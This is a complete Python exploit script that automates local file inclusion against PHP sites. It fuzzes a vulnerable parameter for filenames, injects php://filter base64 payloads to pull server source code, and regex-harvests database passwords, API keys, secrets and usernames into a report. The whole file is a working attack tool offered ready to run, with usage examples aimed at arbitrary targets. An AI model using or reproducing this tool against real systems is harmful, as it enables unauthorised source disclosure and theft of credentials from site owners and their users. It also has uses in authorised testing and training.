#!/usr/bin/env python3
"""
PHP Filter LFI Source Code Disclosure Tool
Automates discovery and extraction of PHP source code via LFI
"""

import requests
import base64
import re
import subprocess
import json
import argparse
from urllib.parse import urljoin, quote
from pathlib import Path
from typing import List, Dict, Optional
import sys

# Color codes for terminal output
class Colors:
    BLUE = '\033[0;34m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    RED = '\033[0;31m'
    NC = '\033[0m'  # No Color
    BOLD = '\033[1m'

class PHPSourceDisclosure:
    def __init__(self, url: str, param: str, output_dir: str = "php_sources"):
        self.url = url
        self.param = param
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.discovered_files = []
        self.secrets_found = []
        
    def print_banner(self):
        """Print tool banner"""
        print(f"{Colors.BLUE}╔════════════════════════════════════════════════════════╗{Colors.NC}")
        print(f"{Colors.BLUE}║     PHP Filter Source Code Disclosure Tool            ║{Colors.NC}")
        print(f"{Colors.BLUE}║     Automated PHP Source Extraction via LFI           ║{Colors.NC}")
        print(f"{Colors.BLUE}╚════════════════════════════════════════════════════════╝{Colors.NC}")
        print()
        print(f"{Colors.YELLOW}[*] Target URL: {self.url}{Colors.NC}")
        print(f"{Colors.YELLOW}[*] Parameter: {self.param}{Colors.NC}")
        print(f"{Colors.YELLOW}[*] Output Directory: {self.output_dir}{Colors.NC}")
        print()

    def discover_php_files_ffuf(self, wordlist: str) -> List[str]:
        """
        Use ffuf to discover PHP files
        """
        print(f"{Colors.BLUE}[PHASE 1] Discovering PHP files with ffuf{Colors.NC}")
        print("=" * 60)
        
        # Parse base URL
        base_url = self.url.split('?')[0]
        
        # Run ffuf
        cmd = [
            'ffuf',
            '-w', wordlist + ':FUZZ',
            '-u', f'{base_url}?{self.param}=FUZZ',
            '-mc', '200',
            '-o', 'ffuf_results.json',
            '-of', 'json',
            '-s'  # Silent mode
        ]
        
        try:
            print(f"{Colors.YELLOW}[*] Running ffuf...{Colors.NC}")
            subprocess.run(cmd, check=True, capture_output=True)
            
            # Parse results
            with open('ffuf_results.json', 'r') as f:
                results = json.load(f)
            
            php_files = []
            if 'results' in results:
                for result in results['results']:
                    url = result.get('url', '')
                    # Extract the FUZZ value (filename)
                    if self.param in url:
                        param_value = url.split(f'{self.param}=')[1].split('&')[0]
                        php_files.append(param_value)
            
            print(f"{Colors.GREEN}[+] Found {len(php_files)} potential PHP files{Colors.NC}")
            return php_files
            
        except FileNotFoundError:
            print(f"{Colors.RED}[!] ffuf not found. Install with: go install github.com/ffuf/ffuf@latest{Colors.NC}")
            return []
        except Exception as e:
            print(f"{Colors.RED}[!] Error running ffuf: {e}{Colors.NC}")
            return []

    def discover_php_files_builtin(self, wordlist: str) -> List[str]:
        """
        Built-in file discovery (fallback if ffuf not available)
        """
        print(f"{Colors.BLUE}[PHASE 1] Discovering PHP files (built-in method){Colors.NC}")
        print("=" * 60)
        
        php_files = []
        base_url = self.url.split('?')[0]
        
        try:
            with open(wordlist, 'r') as f:
                filenames = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Wordlist not found: {wordlist}{Colors.NC}")
            return []
        
        print(f"{Colors.YELLOW}[*] Testing {len(filenames)} filenames...{Colors.NC}")
        
        for i, filename in enumerate(filenames, 1):
            if i % 10 == 0:
                print(f"{Colors.YELLOW}[*] Progress: {i}/{len(filenames)}{Colors.NC}", end='\r')
            
            test_url = f"{base_url}?{self.param}={filename}"
            try:
                response = requests.get(test_url, timeout=5)
                # Basic check: different size or known success indicators
                if response.status_code == 200 and len(response.content) > 0:
                    php_files.append(filename)
            except:
                continue
        
        print()  # New line after progress
        print(f"{Colors.GREEN}[+] Found {len(php_files)} potential PHP files{Colors.NC}")
        return php_files

    def build_php_filter_payload(self, resource: str) -> str:
        """
        Build PHP filter payload for a given resource
        """
        # Remove .php extension if present (often auto-appended)
        resource = resource.replace('.php', '')
        
        # Build filter payload
        payload = f"php://filter/read=convert.base64-encode/resource={resource}"
        return payload

    def extract_base64_from_html(self, html: str) -> Optional[str]:
        """
        Extract base64 encoded content from HTML response
        Looks for long base64 strings
        """
        # Pattern for base64: sequences of A-Za-z0-9+/ with optional padding
        pattern = r'[A-Za-z0-9+/]{50,}={0,2}'
        matches = re.findall(pattern, html)
        
        if matches:
            # Return the longest match (likely the encoded file)
            return max(matches, key=len)
        return None

    def decode_base64(self, encoded: str) -> Optional[str]:
        """
        Decode base64 string
        """
        try:
            decoded_bytes = base64.b64decode(encoded)
            # Try UTF-8 first
            try:
                return decoded_bytes.decode('utf-8')
            except UnicodeDecodeError:
                # Fall back to latin-1
                return decoded_bytes.decode('latin-1')
        except Exception as e:
            print(f"{Colors.RED}[!] Base64 decode error: {e}{Colors.NC}")
            return None

    def scan_for_secrets(self, source_code: str, filename: str) -> List[Dict]:
        """
        Scan source code for sensitive information
        """
        secrets = []
        
        # Patterns for common secrets
        patterns = {
            'Database Password': [
                r'(?:db_pass|database_password|mysql_pass)\s*=\s*["\']([^"\']+)["\']',
                r'\$(?:db_)?pass(?:word)?\s*=\s*["\']([^"\']+)["\']',
            ],
            'API Key': [
                r'(?:api_key|apikey|api_secret)\s*=\s*["\']([^"\']+)["\']',
                r'(?:stripe|aws|stripe_key|aws_key)\s*=\s*["\']([^"\']+)["\']',
            ],
            'Password': [
                r'password\s*=\s*["\']([^"\']+)["\']',
                r'\$pass\s*=\s*["\']([^"\']+)["\']',
            ],
            'Secret Key': [
                r'(?:secret|secret_key|jwt_secret)\s*=\s*["\']([^"\']+)["\']',
            ],
            'Database Host': [
                r'(?:db_host|database_host|mysql_host)\s*=\s*["\']([^"\']+)["\']',
            ],
            'Username': [
                r'(?:db_user|database_user|username)\s*=\s*["\']([^"\']+)["\']',
            ],
            'File Path': [
                r'(?:require|include)(?:_once)?\s*\(?["\']([^"\']+\.php)["\']',
            ],
        }
        
        for secret_type, pattern_list in patterns.items():
            for pattern in pattern_list:
                matches = re.finditer(pattern, source_code, re.IGNORECASE)
                for match in matches:
                    secrets.append({
                        'type': secret_type,
                        'value': match.group(1),
                        'line': source_code[:match.start()].count('\n') + 1,
                        'file': filename
                    })
        
        return secrets

    def extract_source_code(self, filename: str) -> Optional[Dict]:
        """
        Extract source code for a single PHP file
        """
        print(f"{Colors.YELLOW}[*] Extracting: {filename}{Colors.NC}")
        
        # Build PHP filter payload
        payload = self.build_php_filter_payload(filename)
        
        # Build full URL
        base_url = self.url.split('?')[0]
        full_url = f"{base_url}?{self.param}={payload}"
        
        try:
            # Make request
            response = requests.get(full_url, timeout=10)
            
            # Extract base64 content
            base64_content = self.extract_base64_from_html(response.text)
            
            if not base64_content:
                print(f"{Colors.RED}  [✗] No base64 content found{Colors.NC}")
                return None
            
            # Decode base64
            source_code = self.decode_base64(base64_content)
            
            if not source_code:
                print(f"{Colors.RED}  [✗] Failed to decode{Colors.NC}")
                return None
            
            # Verify it's PHP code
            if '<?php' not in source_code and '<?=' not in source_code:
                print(f"{Colors.RED}  [✗] Doesn't appear to be PHP code{Colors.NC}")
                return None
            
            print(f"{Colors.GREEN}  [✓] Successfully extracted source code!{Colors.NC}")
            
            # Scan for secrets
            secrets = self.scan_for_secrets(source_code, filename)
            
            if secrets:
                print(f"{Colors.GREEN}  [✓] Found {len(secrets)} potential secrets!{Colors.NC}")
                self.secrets_found.extend(secrets)
            
            # Save to file
            output_file = self.output_dir / f"{filename.replace('/', '_')}.php"
            output_file.write_text(source_code)
            print(f"{Colors.GREEN}  [✓] Saved to: {output_file}{Colors.NC}")
            
            return {
                'filename': filename,
                'source_code': source_code,
                'secrets': secrets,
                'output_file': str(output_file)
            }
            
        except Exception as e:
            print(f"{Colors.RED}  [✗] Error: {e}{Colors.NC}")
            return None

    def generate_report(self):
        """
        Generate final report
        """
        print()
        print(f"{Colors.BLUE}╔════════════════════════════════════════════════════════╗{Colors.NC}")
        print(f"{Colors.BLUE}║                    FINAL REPORT                        ║{Colors.NC}")
        print(f"{Colors.BLUE}╚════════════════════════════════════════════════════════╝{Colors.NC}")
        print()
        
        print(f"{Colors.BOLD}Summary:{Colors.NC}")
        print(f"  Files extracted: {len(self.discovered_files)}")
        print(f"  Secrets found: {len(self.secrets_found)}")
        print()
        
        if self.secrets_found:
            print(f"{Colors.RED}{Colors.BOLD}[!] SENSITIVE INFORMATION DISCOVERED:{Colors.NC}")
            print()
            
            # Group by type
            by_type = {}
            for secret in self.secrets_found:
                secret_type = secret['type']
                if secret_type not in by_type:
                    by_type[secret_type] = []
                by_type[secret_type].append(secret)
            
            for secret_type, secrets in by_type.items():
                print(f"{Colors.YELLOW}{secret_type}:{Colors.NC}")
                for secret in secrets:
                    print(f"  File: {secret['file']} (line {secret['line']})")
                    print(f"  Value: {Colors.RED}{secret['value']}{Colors.NC}")
                    print()
        
        # Save report to file
        report_file = self.output_dir / "report.txt"
        with open(report_file, 'w') as f:
            f.write("PHP Source Code Disclosure Report\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Target: {self.url}\n")
            f.write(f"Parameter: {self.param}\n\n")
            f.write(f"Files Extracted: {len(self.discovered_files)}\n")
            f.write(f"Secrets Found: {len(self.secrets_found)}\n\n")
            
            if self.secrets_found:
                f.write("SENSITIVE INFORMATION:\n")
                f.write("-" * 60 + "\n\n")
                
                by_type = {}
                for secret in self.secrets_found:
                    secret_type = secret['type']
                    if secret_type not in by_type:
                        by_type[secret_type] = []
                    by_type[secret_type].append(secret)
                
                for secret_type, secrets in by_type.items():
                    f.write(f"{secret_type}:\n")
                    for secret in secrets:
                        f.write(f"  File: {secret['file']} (line {secret['line']})\n")
                        f.write(f"  Value: {secret['value']}\n\n")
        
        print(f"{Colors.GREEN}[+] Report saved to: {report_file}{Colors.NC}")

    def run(self, wordlist: str, use_ffuf: bool = True):
        """
        Main execution flow
        """
        self.print_banner()
        
        # Phase 1: Discover PHP files
        if use_ffuf:
            php_files = self.discover_php_files_ffuf(wordlist)
            if not php_files:
                print(f"{Colors.YELLOW}[*] Falling back to built-in discovery{Colors.NC}")
                php_files = self.discover_php_files_builtin(wordlist)
        else:
            php_files = self.discover_php_files_builtin(wordlist)
        
        if not php_files:
            print(f"{Colors.RED}[!] No PHP files discovered{Colors.NC}")
            return
        
        print()
        
        # Phase 2: Extract source code
        print(f"{Colors.BLUE}[PHASE 2] Extracting PHP source code{Colors.NC}")
        print("=" * 60)
        
        for php_file in php_files:
            result = self.extract_source_code(php_file)
            if result:
                self.discovered_files.append(result)
        
        print()
        
        # Phase 3: Generate report
        self.generate_report()


def main():
    parser = argparse.ArgumentParser(
        description='PHP Filter LFI Source Code Disclosure Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic usage with ffuf
  %(prog)s -u "http://target.com/index.php?page=home" -p page -w php_files.txt
  
  # Use built-in fuzzing (no ffuf)
  %(prog)s -u "http://target.com/index.php?page=home" -p page -w php_files.txt --no-ffuf
  
  # Custom output directory
  %(prog)s -u "http://target.com/index.php?page=home" -p page -w php_files.txt -o results
  
  # Test specific files directly
  %(prog)s -u "http://target.com/index.php?page=home" -p page -f config,index,admin
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--param', required=True, help='Vulnerable parameter name')
    parser.add_argument('-w', '--wordlist', help='Wordlist for PHP file discovery')
    parser.add_argument('-f', '--files', help='Comma-separated list of specific files to test')
    parser.add_argument('-o', '--output', default='php_sources', help='Output directory (default: php_sources)')
    parser.add_argument('--no-ffuf', action='store_true', help='Use built-in fuzzing instead of ffuf')
    
    args = parser.parse_args()
    
    # Create tool instance
    tool = PHPSourceDisclosure(args.url, args.param, args.output)
    
    # If specific files provided, test those
    if args.files:
        tool.print_banner()
        print(f"{Colors.BLUE}[PHASE 1] Testing specific files{Colors.NC}")
        print("=" * 60)
        
        files = [f.strip() for f in args.files.split(',')]
        
        print(f"{Colors.BLUE}[PHASE 2] Extracting PHP source code{Colors.NC}")
        print("=" * 60)
        
        for php_file in files:
            result = tool.extract_source_code(php_file)
            if result:
                tool.discovered_files.append(result)
        
        print()
        tool.generate_report()
    
    # Otherwise use wordlist
    elif args.wordlist:
        tool.run(args.wordlist, use_ffuf=not args.no_ffuf)
    
    else:
        print(f"{Colors.RED}[!] Must provide either --wordlist or --files{Colors.NC}")
        parser.print_help()
        sys.exit(1)


if __name__ == '__main__':
    main()